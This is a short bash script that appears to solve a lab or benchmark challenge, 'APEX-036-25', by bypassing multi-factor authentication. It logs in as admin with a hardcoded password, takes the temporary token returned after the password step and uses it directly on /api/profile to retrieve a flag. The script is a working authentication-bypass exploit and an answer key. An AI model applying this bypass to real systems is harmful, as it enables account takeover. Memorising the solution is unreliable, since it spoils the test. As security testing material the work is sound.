#!/usr/bin/env bash
# APEX-036-25 — "MFA Bypass via Response Manipulation" (tags: mfa, authentication)
#
# The password step hands back a `tempToken` meant only to carry the login into
# the second factor. It is an ordinary JWT for the same user, and the endpoints
# behind the second factor check that a token is valid and never that MFA
# actually happened. So the second factor is optional for anybody who declines
# to perform it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex036-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=admin --set 'json.password=SecurePass123!' | body |
    python3 -c 'import json,sys
reply = json.load(sys.stdin)
print(reply.get("tempToken") or reply.get("token") or "")')"

send "$SESSION" req_0 --create \
    --set path=/api/profile \
    --set "header.Authorization=Bearer $TOKEN" | flag
